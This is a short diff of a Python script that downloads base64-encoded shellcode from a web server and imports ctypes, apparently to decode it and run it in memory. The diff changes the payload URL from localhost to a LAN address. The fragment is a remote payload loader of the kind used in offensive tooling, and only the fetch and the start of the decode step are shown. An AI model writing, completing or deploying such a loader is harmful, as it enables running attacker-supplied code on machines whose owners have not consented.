@@ -3,7 +3,7 @@ import ctypes
 import base64
 
 # retrieve the shellcode from our web server
-url = "http://localhost:8000/shellcode.bin"
+url = "http://192.168.1.7:8000/shellcode.bin"
 response = urllib2.urlopen(url)
 
 # decode the shellcode from base64 
